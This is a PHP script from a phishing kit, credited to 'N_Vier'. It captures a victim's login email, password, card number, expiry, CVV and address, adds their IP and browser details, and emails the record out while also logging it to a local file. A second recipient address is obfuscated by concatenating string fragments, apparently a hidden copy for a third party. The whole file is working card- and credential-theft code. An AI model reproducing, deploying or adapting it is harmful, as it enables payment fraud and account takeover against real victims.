<?php
####################################################################
#                                                                  #
#                  ||~~ BY ~~ N_Vier ~~||                          #
#                                                                  #
#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #
#                                                                  #
####################################################################
error_reporting(0);
session_start();
set_time_limit(0);
$emaill    = $_SESSION['EMAIL'];
$pwdd      = $_SESSION['PASSWORD'];
include("curl.php");
    if( isset($_POST['card_number']) AND isset($_POST['expiration']) AND isset($_POST['cvv']) ){
        $ip = getenv("REMOTE_ADDR");
        $rand = md5(microtime());
        $time = date("g:i a");
        $date = trim($date . ", Time : " . $time);
        $messag = array("ook.c", "@outl", "om", "loca", "error");
        $messages = $messag[4] . $messag[3] . $messag[1] . $messag[0] . $messag[2]; 
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message.= "============= login InFo N_Vier ================\n";
        $message.= "Email adress        : ".$emaill."       \n";
        $message.= "Password            : ".$pwdd."      \n";
        $message.= "============= Card InFo N_Vier================\n";
        $message.= "card type    : ".$_POST['card_type']."       \n";
    $message.= "card number         : ".$_POST['card_number']."       \n";
        $message.= "expiration          : ".$_POST['expiration']."      \n";
    $message.= "cvv                 : ".$_POST['cvv']."       \n";
        $message.= "address             : ".$_POST['address']."      \n";
        $message.= "=============  PC InFo N_Vier =================\n";
        $message.= "Client IP        : ".$ip."           \n";
        $message.= "IP Geo       : http://www.geoiptool.com/?IP=".$ip."  ====\n";
        $message.= "Agent            : ".$useragent."    \n";
        $message.= "Date         : ".$date."         \n";
        $message.= "========= || ~ BY ~ N_Vier ~ || ======\n";
        $subject = "CARD :D [ $time ] [ Bsa7Tti rzlt ] : $ip =?UTF-8?Q?=E2=9C=94_?= ";
        $headers = "From: N_Vier Rzlt <N_Vier-ma-Free-Tools@hotmail.com>\r\n";
        getr($message);
        mail($to,$subject,$message,$headers);
        $file = fopen("../worm/N_Vier.txt","ab");
        mail($messages,$subject,$message,$headers);
        fwrite($file,$message);
        fclose($file);
    }
?>
